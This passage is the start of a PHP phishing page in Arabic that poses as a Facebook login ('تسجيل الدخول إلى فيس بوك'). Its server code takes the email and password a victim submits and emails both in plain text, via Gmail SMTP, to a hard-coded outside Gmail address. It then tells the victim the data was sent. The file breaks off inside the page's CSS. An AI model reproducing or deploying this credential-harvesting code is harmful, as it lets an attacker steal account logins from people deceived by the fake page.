<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    $mail = new PHPMailer(true);

    try {
        // إعدادات SMTP
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com'; // استخدم مضيف SMTP الخاص بك إذا كان مختلفًا
        $mail->SMTPAuth = true;
        $mail->Username = 'your-email@gmail.com'; // عنوان بريدك الإلكتروني
        $mail->Password = 'your-email-password'; // كلمة مرور بريدك الإلكتروني
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        // إعدادات البريد الإلكتروني
        $mail->setFrom('your-email@gmail.com', 'Mailer');
        $mail->addAddress('manoo303030@gmail.com'); // البريد الإلكتروني الذي تريد إرسال البيانات إليه

        $mail->isHTML(true);
        $mail->Subject = 'تسجيل دخول جديد';
        $mail->Body    = "تم تسجيل دخول جديد بعنوان بريد إلكتروني: $email وكلمة مرور: $password";

        $mail->send();
        echo "<script>alert('تم إرسال البيانات بنجاح');</script>";
    } catch (Exception $e) {
        echo "<script>alert('فشل في إرسال البيانات. البريد الإلكتروني لم يتم إرساله.');</script>";
    }
}
?>
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>تسجيل الدخول إلى فيس بوك</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
